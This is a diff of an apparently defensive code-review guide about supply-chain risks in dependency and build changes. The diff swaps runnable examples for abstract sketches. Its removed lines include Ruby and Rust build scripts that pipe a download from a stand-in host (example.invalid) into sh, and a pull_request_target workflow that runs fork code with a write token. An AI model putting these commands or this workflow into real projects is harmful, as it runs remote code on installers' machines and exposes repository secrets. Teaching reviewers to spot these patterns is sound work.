@@ -2,7 +2,7 @@
 
 A dependency, manifest, lockfile, or build-configuration change can run code on every machine that installs, builds, or opens the project. Review each entry against what the diff actually imports, and decide what executes by capability rather than by the field names of any one ecosystem.
 
-**Reading the examples in this file.** Several fenced blocks reproduce a hostile build descriptor or an unsafe workflow in full, each with a comment saying what runs it and why nothing declares it, so that its shape can be recognized in a change under review. They are illustrations for a reviewer to read, never commands for this review to run and never files to create.
+**Reading the examples in this file.** Several fenced blocks sketch a hostile build descriptor or an unsafe workflow as a shape rather than as a working file, each labelled with what runs it and why nothing declares it, so that its form can be recognized in a change under review. Angle brackets mark the part that carries the harm. Nothing in these blocks runs, nothing in them is a command for this review to carry out, and nothing in them is a file to create.
 
 - [Reconcile the manifest against what the diff imports](#reconcile-the-manifest-against-what-the-diff-imports)
 - [Signals in an added or upgraded dependency](#signals-in-an-added-or-upgraded-dependency)
@@ -55,26 +55,29 @@ Go declares no install hook at all, which moves the vector to compile and test t
 
 The failure mode is a reviewer who searches the manifest for lifecycle fields, finds none, and approves. Two rows in the table above have no manifest field to find. A Rust crate with a `build.rs` at its root runs it before compilation with no `build` key present, and a package with a `binding.gyp` at its root triggers a native rebuild with no `scripts` entry present. The descriptor is a program holding the privileges of the process that installs or builds.
 
-```ruby
-# extconf.rb at the gem root. The gemspec names no script; the package
-# manager runs this file because the gem declares a native extension.
-require "mkmf"
-system("curl -fsSL https://example.invalid/stage-two | sh")
-create_makefile("example")
+```text
+Native-extension build script at the package root.
+The manifest names no script. The package manager runs this file anyway,
+because the package declares a native extension.
+
+    load the build helper
+    <fetch a script from a network host and execute it>
+    write the makefile
+
+The middle step is the finding. Nothing in the manifest points at it.
 ```
 
 The Rust case declares less still, because the file name and its position at the crate root are the entire declaration:
 
-```rust
-// build.rs at the crate root. The manifest carries no `build` key; the
-// toolchain runs this file before compiling because of where it sits.
-fn main() {
-    std::process::Command::new("sh")
-        .arg("-c")
-        .arg("curl -fsSL https://example.invalid/stage-two | sh")
-        .status()
-        .ok();
-}
+```text
+Build script at the crate root.
+The manifest carries no build key. The toolchain runs this file before
+compiling, purely because of where it sits.
+
+    main:
+        <spawn a shell that fetches a script from a network host and runs it>
+
+The file's location is the whole declaration, so a manifest search finds nothing.
 ```
 
 Checks for any dependency carrying a compiled component: whether the build downloads a prebuilt binary instead of compiling and from which host, whether it resolves a build backend or toolchain over the network at build time, and whether it writes outside the build directory. A step that fetches a binary from an address outside the registry is both code execution and an off-registry source, and it is reported once with both facts.
@@ -87,17 +90,16 @@ An attestation binds a published artifact to a build: a source revision, a build
 
 Field and trigger names differ per continuous-integration system; the capabilities do not.
 
-```yaml
-on: pull_request_target # runs in the base repository context, with its secrets
-jobs:
-    build:
-        permissions:
-            contents: write
-        steps:
-            - uses: third-party/checkout@v4 # mutable tag, repointable after review
-              with:
-                  ref: ${{ github.event.pull_request.head.sha }} # untrusted code
-            - run: make build # runs it, with the write token and secrets in scope
+```text
+Workflow triggered on a pull request from a fork, in the BASE repository
+context, so the job holds the base repository's secrets.
+
+    permissions        contents: write
+    step 1  checkout   <a third-party action pinned to a mutable tag>
+                       ref: <the fork's head revision, code the author controls>
+    step 2  run        <the project's build command, over that checked-out code>
+
+Each line is ordinary alone. Together they run a stranger's code with a write token.
 ```
 
 Three properties combine there: the trigger supplies the base repository's credentials, the checkout brings in code any fork author controls, and the build step executes that code. Each is ordinary alone, and together they hand a write token to a stranger. Report the combination, not one line of it. Then check the rest of the surface:
